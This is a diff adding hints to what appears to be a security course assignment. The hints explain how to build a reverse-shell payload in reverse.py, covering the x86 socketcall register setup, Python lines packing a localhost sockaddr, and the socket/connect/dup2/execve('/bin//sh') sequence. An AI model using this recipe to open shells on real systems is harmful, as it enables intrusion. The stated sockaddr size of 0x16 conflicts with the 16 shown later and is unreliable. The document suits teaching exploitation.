@@ -213,6 +213,26 @@ There are several ways to call these functions. Since they appear in target, itâ
 
 See the associated manual pages for example usage and see the hints below for suggestions on making these system calls. And see the example below for the arguments to the system calls. The socket-related system calls all use the same system call number sys_socketcall. As described on kernelgrok, eax is set to 0x66. ebx is set to the actual socket call you want to make. Lastly, ecx points to an array of the arguments to pass.
 
+To perform the socket(2) system call, you would need to set eax to 0x66, ebx to 0x1, and ecx as a pointer to a memory location (Can use @.data). The memory location pointed to by the ecx pointer should have the first 4 bytes as AF_NET (0x2), the next 4 bytes as SOCK_STREAM (0x1) and the last 4 bytes as 0x0 for the protocol. The return value of this system call will be stored in the eax register and will be used as one of the arguments to the connect(2) system call.
+
+To perform the connect(2) system call, you would need to set eax to 0x66, ebx to 0x3, and ecx as a pointer to a memory location (Can use @.data).  The memory location pointed to by the ecx pointer should have the first 4 bytes as the socket file descriptor, which was returned earlier by the socket(2) system call, the next 4 bytes as yet another pointer to a memory location on the STACK (let's call this location L), and the remaining 4 bytes should be the size of the sockaddr struct, which is 0x16. The location L should have 8 bytes of data. You can use the following two lines directly in your payload, wherever you want to write the 8 bytes for memory location L. Here `<connect_port>` is the second argument that you provide to the reverse.py file.
+
+`
+p += (socket.htons(2).to_bytes(2, 'big') + <connect_port>.to_bytes(2, 'big')) # AF_INET and PORT
+p += pack('<I', 0x0100007f) # Load the Localhost IP address
+`
+
+In essence you want to make the following system calls  :
+    
+    socket(PF_INET(0x2), SOCK_STREAM(0x1), IPPROTO_TCP(0x0)) = 5;
+    connect(5, {sa_family=AF_INET(0x2), sin_port=htons(<connect_port>), sin_addr=inet_addr("127.0.0.1")}, 16) = 0;
+    dup2(5, 0);
+    dup2(5, 1);
+    dup2(5, 2);
+    execve("/bin//sh", [], [/* 6 vars */])
+    
+You can reuse code from previous tasks for the `dup2` and `execve` system calls.
+
 The connection should be to 127.0.0.1 and the port should be specified as an argument to reverse.py (see example below).
 
 To complete this task, modify reverse.py to:
